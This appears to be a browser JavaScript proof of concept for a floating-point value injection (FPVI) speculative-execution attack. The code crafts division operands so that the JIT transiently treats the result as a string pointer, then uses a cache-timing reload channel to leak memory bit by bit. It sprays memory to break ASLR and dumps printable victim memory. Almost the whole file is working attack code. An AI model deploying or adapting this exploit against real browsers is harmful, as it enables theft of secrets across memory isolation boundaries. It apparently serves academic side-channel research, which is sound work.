//*****************************************************************************
// SHIFT+RELOAD
// Idea based on streamline: https://memlab.ece.gatech.edu/papers/ASPLOS_2021_1.pdf
//*****************************************************************************
const STRIDE = 1024
const STRIDE_LOG = 10
const BITWIDTH = 2
const BITWIDTH_MASK = 0x1
const K = 128*1024*1024/(BITWIDTH*STRIDE)    //Allocate 128MB of reload buffers
const ITER = 100
const ITER_CALIBRATION = 10000
const AMPLIFICATION = 32;
var   THRESHOLD = 0;

//Allocate reload buffers
var reload_bufs   = new Array(K);
var reload_bufs_8 = new Array(K);
for(var i=0; i<K; i++) {
    reload_bufs[i]     = new ArrayBuffer(BITWIDTH*STRIDE);
    reload_bufs_8[i]   = new Uint8Array(reload_bufs[i]).fill(0x88);
}
var results      = new Uint32Array(BITWIDTH).fill(0x00)
var cur_k_idx = 0   //Current reload buffer index

var reload_time = new Array(BITWIDTH);
for(var i=0; i<BITWIDTH; i++) {
    reload_time[i]     = new Float64Array(ITER_CALIBRATION).fill(0x00);
}


function reload(results) {
    var t0 = 0;
    var dt = 0;
    var res = 0
    for (var i=0; i<BITWIDTH; i++) {

        t0 = performance.now();
        for(var j=0; j<AMPLIFICATION; j++) {
            res += reload_bufs_8[(cur_k_idx+j)%K][i*STRIDE];
        }
        dt = (performance.now() - t0);

        //console.log(dt+" "+THRESHOLD)
        if (dt < THRESHOLD) {
            results[i] += 1;
        }
    }

    return res
}

function print_results(results) {
    for (var i = 0; i < BITWIDTH; i++) {
        if(results[i] > 0) {
            console.log("0x"+i.toString(16)+"\t"+results[i])
        }
    }
}
//*****************************************************************************


//*****************************************************************************
// HELPER FUNCTIONS
//*****************************************************************************
//This function convert a big int 64 bit number to the corresponding double
function hex_to_double(x) {
    var buf   = new ArrayBuffer(8);
    var buf_f = new Float64Array(buf)
    var buf_b = new Uint8Array(buf)

    if (typeof x != "bigint") {
        throw "argument must be big int"
    }

    for(i=0n; i<8n; i++)
    {
        buf_b[i] = Number((x>>(i*8n)) & 0xffn)
    }

    return buf_f[0]
}

//This function convert a 64 bit double number to the corresponding hex representation
function double_to_hex(x) {
    var buf   = new ArrayBuffer(8);
    var buf_f = new Float64Array(buf)
    var buf_b = new Uint8Array(buf)

    if (typeof x != "number") {
        throw "argument must be number"
    }

    buf_f[0] = x
    res = 0n

    for(i=0n; i<8n; i++)
    {
        res = res | (BigInt(buf_b[i])<<(8n*i))
    }

    return res
}

//https://stackoverflow.com/questions/35624825/c-isprint-equivalent-in-javascript
function isprint(char) {
         return !( /[\x00-\x08\x0E-\x1F\x80-\xFF]/.test(char));
}

//https://github.com/vusec/smash/blob/master/smash.js
function median(x) {
    x.sort();
    let y = x[Math.floor((x.length + 1) / 2) - 1]
        + x[Math.ceil((x.length + 1) / 2) - 1];
    return y / 2;
}

https://stackoverflow.com/questions/7343890/standard-deviation-javascript
function stdev (array) {
  const n = array.length
  const mean = array.reduce((a, b) => a + b) / n
  return Math.sqrt(array.map(x => Math.pow(x - mean, 2)).reduce((a, b) => a + b) / n)
}

//Given a target address this function find the X and Y operands of a division
//that gives as transient result a string pointer to the desired target.
//Ex:
//        x = 0xbffb0deadbeef007       -1.690898e+00    (  NORMAL    biased_exp= 1023    unbiased_exp=    0    mantissa=0xb0deadbeef007)
//        y = 0x0000000000000001       4.940656e-324    (DENORMAL    biased_exp=    0    unbiased_exp=-1022    mantissa=0x0000000000001)
// arch_res = 0xfff0000000000000                -inf    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0x0000000000000)
//trans_res = 0xfffb0deadbeef000                -nan    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0xb0deadbeef000)
//
//        x = 0xbffb0deadbeef00f       -1.690898e+00    (  NORMAL    biased_exp= 1023    unbiased_exp=    0    mantissa=0xb0deadbeef00f)
//        y = 0x0000000000000001       4.940656e-324    (DENORMAL    biased_exp=    0    unbiased_exp=-1022    mantissa=0x0000000000001)
// arch_res = 0xfff0000000000000                -inf    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0x0000000000000)
//trans_res = 0xfffb0deadbeef008                -nan    (  NORMAL    biased_exp= 2047    unbiased_exp= 1024    mantissa=0xb0deadbeef008)
//
// WARNING: due to FPU truncation/rounding logic the last digit of the address must be either 0x0 or 0x8
function find_x_y(target_addr) {

    if (typeof target_addr != "bigint") {
        throw "argument must be bigint"
    }

    if(target_addr>>47n != 0n)
    {
        throw "too large addr"
    }

    yh = 0x0000000000000001n
    xh = 0xbffb000000000000n    //ffb is String tag
    xh = xh | (target_addr & 0x00007ffffffffff0n)

    offset = target_addr & 0xfn
    if(offset == 0) {
        xh |= 0x7n
    } else if(offset == 8) {
        xh |= 0xfn
    } else {
        throw "Offset not supported"
    }

    return [hex_to_double(xh), hex_to_double(yh), xh, yh]
}

function log(s) {
    console.log(s)
}

function log_res(addr, res4, res5, res6, res7) {
        log("0x"+(addr+4n).toString(16)+": "
            + res4.toString(16).padStart(2,"0")+" "
            + res5.toString(16).padStart(2,"0")+" "
            + res6.toString(16).padStart(2,"0")+" "
            + res7.toString(16).padStart(2,"0")+" "
            + "     "+
            (isprint(String.fromCharCode(res4&0xff)) ? String.fromCharCode(res4) : '.') +
            (isprint(String.fromCharCode(res5&0xff)) ? String.fromCharCode(res5) : '.') +
            (isprint(String.fromCharCode(res6&0xff)) ? String.fromCharCode(res6) : '.') +
            (isprint(String.fromCharCode(res7&0xff)) ? String.fromCharCode(res7) : '.')
            )
}
//*****************************************************************************





/* FPVI PoC
 * x,y:  FP operands that yield to the desired transient result
 * k:    reload_buffer index
 * bit_pos: which bit should be leaked (0..31)
 * rand: a variable that constantly changes between 0 and 1 to jit and execute
 *       both if's branches
 * two: a variable always equal to 2.0 (Parameter to avoid JIT inlining)
 * str: always a string to speculative JIT z.length on strings only
 */
function confuse(x, y, k, bit_pos, rand, two, str) {
    var z = 0;

    //Make reload_buf hot to make later accesses faster
    var reload_buf8 = reload_bufs_8[k]
    var hot = reload_buf8[str.length<<STRIDE_LOG]

    if(rand != 0) {
        //the *two/two is a trick to enlarge the transient window due to higher FPU pressure
        z = x/(y*two/two)
    } else {
        z = str;
    }

    //At this point, if rand!=0, z has two possible values:
    //architectural_z   = JSDouble value -inf
    //transient_z       = JSString pointer to crafted string pointer
    if (typeof z == "string") {
        return reload_buf8[((z.length>>bit_pos)&BITWIDTH_MASK)<<STRIDE_LOG]
    } else {
        return hot;
    }
}

//addr:   address to leak byte
//iters:  how many iterations to perform (the more the merrier for noise)
//return: leaked byte, -1 if the address is not mapped
function leak(addr, iters) {

    if (typeof addr != "bigint") {
        throw "addr must be bigint"
    }

    //Due to FPU precision only 8/16 offsets are supported
    var offset = addr & 0xFn;
    var pos = -1;
    if     (offset === 0x4n) pos = 0
    else if(offset === 0x5n) pos = 1
    else if(offset === 0x6n) pos = 2
    else if(offset === 0x7n) pos = 3
    else if(offset === 0xCn) pos = 0
    else if(offset === 0xDn) pos = 1
    else if(offset === 0xEn) pos = 2
    else if(offset === 0xFn) pos = 3
    else throw "address not supported"

    //Find x and y that yield to transient NaN-boxed string pointing to addr
    var fpvi_op = find_x_y(addr&0xfffffffffffffff8n);
    var x = fpvi_op[0];
    var y = fpvi_op[1];
    var leaked_byte = 0;

    //avoid constatnts JITing
    const twos = [2.0, 2.0, 2.0, 2.0]
    const strs_0 = ["", "", "", ""]
    const strs_1 = ["A", "B", "C", "D"]

    //dummy var to force code to be executed
    var sum = 0

    //First time leak with arch hits on 0 (strs_0)
    //For each bit in a byte
    for(var b=0; b<8; b++) {
        //Repeat the leak iters times for reliability
        results.fill(0)
        for(var i=0; i<iters; i++) {
            //Repeat the leak AMPLIFICATION times to better measure time deltas
            for(var j=0; j<AMPLIFICATION; j++) {
                sum += confuse(x, y,
                               (cur_k_idx+j)%K,
                               (pos*8)+b,
                               i % 100,
                               twos[i%twos.length],
                               strs_0[i%strs_0.length]);
            }
            reload(results)

            cur_k_idx = (cur_k_idx + AMPLIFICATION)%K
        }

        //If we have hit 1 great, we stop here
        if(results[1] > iters/10) {
            leaked_byte |= (1<<b);
            continue;
        }

        //We have only hit 0, this can be the arch hit
        //Let's retry with arch hits on 1 (strs_1)
        results.fill(0)
        for(var i=0; i<iters; i++) {
            //Repeat the leak AMPLIFICATION times to better measure time deltas
            for(var j=0; j<AMPLIFICATION; j++) {
                sum += confuse(x, y,
                               (cur_k_idx+j)%K,
                               (pos*8)+b,
                               i % 100,
                               twos[i%twos.length],
                               strs_1[i%strs_1.length]);
            }
            reload(results)

            cur_k_idx = (cur_k_idx + AMPLIFICATION)%K
        }

        //If we have no hit on 0 it means we haven't hit neither 0 or 1: return -1
        if(results[0] <= iters/10) {
            return -1;
        }
    }

    return leaked_byte;
}



//*****************************************************************************
// CALIBRATION functions
//*****************************************************************************
function arch_hit_time(bit) {
    var dummy = 0;
    var t0 = 0;

    for(var i=0; i<BITWIDTH; i++) {
        reload_time[i].fill(0);
    }

    //For every measurement
    for(var i=0; i<ITER_CALIBRATION; i++) {

        //Do AMPLIFICATION accesses for bigger deltas
        for(var j=0; j<AMPLIFICATION; j++) {
            //Arch hit
            dummy += reload_bufs_8[(cur_k_idx+j)%K][bit<<STRIDE_LOG];
        }

        //Reload
        for (var b=0; b<BITWIDTH; b++) {

            t0 = performance.now();
            for(var k=0; k<AMPLIFICATION; k++) {
                dummy += reload_bufs_8[(cur_k_idx+k)%K][b*STRIDE];
            }
            reload_time[b][i] = (performance.now() - t0);
        }
        cur_k_idx = (cur_k_idx + AMPLIFICATION)%K;
    }

    return dummy;
}

function find_best_threshold() {
    var hit_m, miss_m, thr_0, thr_1 = 0;

    arch_hit_time(0);

    hit_m  = median(reload_time[0]);
    miss_m = median(reload_time[1]);
    if(hit_m >= miss_m) return -1;
    thr_0 =  hit_m+((miss_m - hit_m)/4);
    //log("THR "+thr_0);

    var traces = [
    {
        x: reload_time[0],
        type: 'histogram',
    },
    {
        x: reload_time[1],
        type: 'histogram',
    },
    {
        x: new Float64Array(ITER_CALIBRATION).fill(thr_0),
        type: 'histogram',
    }];
    Plotly.newPlot('hist_div_0', traces);

    arch_hit_time(1);

    hit_m  = median(reload_time[1]);
    miss_m = median(reload_time[0]);
    if(hit_m >= miss_m) return -1;
    thr_1 =  hit_m+((miss_m - hit_m)/4);
    //log("THR "+thr_1);

    var traces = [
    {
        x: reload_time[0],
        type: 'histogram',
    },
    {
        x: reload_time[1],
        type: 'histogram',
    },
    {
        x: new Float64Array(ITER_CALIBRATION).fill(thr_0),
        type: 'histogram',
    }];
    Plotly.newPlot('hist_div_1', traces);

    return (thr_0+thr_1)/2
}

//This function has the job to calibrate threshold
function on_button_calibrate() {
    //Force jit
    arch_hit_time(0);
    arch_hit_time(1);

    THRESHOLD = find_best_threshold();

    log("Calibration done. AMPLIFICATION="+AMPLIFICATION+", THREHSOLD="+THRESHOLD);
}


//*****************************************************************************
// ON BUTTON CLICK CALLBACKS
//*****************************************************************************
function on_button_leak() {
    addr = document.getElementById("addr").value
    addr = BigInt(addr)

    //warm up jitting
    res = leak(4n, 10000)

    for(var i=0; i<8; i++) {
        res4 = leak(addr+0x4n, ITER)
        res5 = leak(addr+0x5n, ITER)
        res6 = leak(addr+0x6n, ITER)
        res7 = leak(addr+0x7n, ITER)

        log_res(addr, res4, res5, res6, res7)
        addr += 0x8n
    }
    log("--------------------")
}

function on_button_attack()
{
    var   hit_known_mem_addr = 0x0n
    var   end_known_mem_addr = 0x0n
    var   addr = 0x7f0000000000n

    log("========= Starting attack =========")

    on_button_calibrate();

    //warm up jitting
    leak(4n, 10000)

    //Spray memory with 0x88 to break ASLR
    var known_mem = []
    log("[+] Spraying memory pattern")
    for(i=0; i<1024; i++) {
        known_mem[i] = new Uint8Array(2*1024*1024).fill(0x88);
    }
    log("    Done")

    log("[+] Breaking ASLR...")

    log(" - Start coarse-grained pattern search...")
    for(var i=0; i<4096; i++)
    {
        res4 = leak(addr+0x4n, ITER)
        res5 = leak(addr+0x5n, ITER)
        res6 = leak(addr+0x6n, ITER)
        res7 = leak(addr+0x7n, ITER)

        //log_res(addr, res4, res5, res6, res7)

        if ((res4 == 0x88) && (res5 == 0x88) && (res6 == 0x88) && (res7 == 0x88)) {
            hit_known_mem_addr = addr
            break
        }

        addr += 0x0010000000n
    }

    if(hit_known_mem_addr == 0n) {
        log("ASLR breaking failed! Try to recalibrate again");
        return;
    }

    log("   Done!")
    log(" - Start fine-grained pattern search...")
    var no_hit_in_a_row = 0
    addr = hit_known_mem_addr
    for(var i=0; i<4*1024; i++)
    {
        res4 = leak(addr+0x4n, ITER)
        res5 = leak(addr+0x5n, ITER)
        res6 = leak(addr+0x6n, ITER)
        res7 = leak(addr+0x7n, ITER)

        //log_res(addr, res4, res5, res6, res7)

        if ((res4 == 0x88) && (res5 == 0x88) && (res6 == 0x88) && (res7 == 0x88)) {
            no_hit_in_a_row = 0
        } else {
            no_hit_in_a_row += 1
        }

        if(no_hit_in_a_row > 4){
            end_known_mem_addr = addr - 4n*0x0000200000n
            break
        }

        addr += 0x0000200000n
    }

    if(end_known_mem_addr == 0n) {
        log("ASLR breaking failed! Try to recalibrate again");
        return;
    }

    log("   Done!")
    log("[+] ASLR broken! Found memory pattern @ 0x"+end_known_mem_addr.toString(16))

    log("[+] Leaking victim memory...")
    addr = end_known_mem_addr
    for(var i=0; i<8*1024; i++)
    {
        res4 = leak(addr+0x14n, ITER)   //at +00 there are the string flags, leak a bit after
        res5 = leak(addr+0x15n, ITER)
        res6 = leak(addr+0x16n, ITER)
        res7 = leak(addr+0x17n, ITER)

        //Leak everything
        //if (res4 != -1 && res5 != -1 && res6 != -1 && res7 !=-1) {

        //Leak only printable chars
        if ((isprint(String.fromCharCode(res4&0xff))) && (isprint(String.fromCharCode(res5&0xff))) &&
            (isprint(String.fromCharCode(res6&0xff))) && (isprint(String.fromCharCode(res7&0xff))) ) {
            var inner_addr = addr
            for(var j=0; j<32; j++) {
                res4 = leak(inner_addr+0x4n, ITER)
                res5 = leak(inner_addr+0x5n, ITER)
                res6 = leak(inner_addr+0x6n, ITER)
                res7 = leak(inner_addr+0x7n, ITER)
                log_res(inner_addr, res4, res5, res6, res7)
                inner_addr += 0x8n
            }
            log("--------------------")
        }

        addr += 0x100000n
    }
}
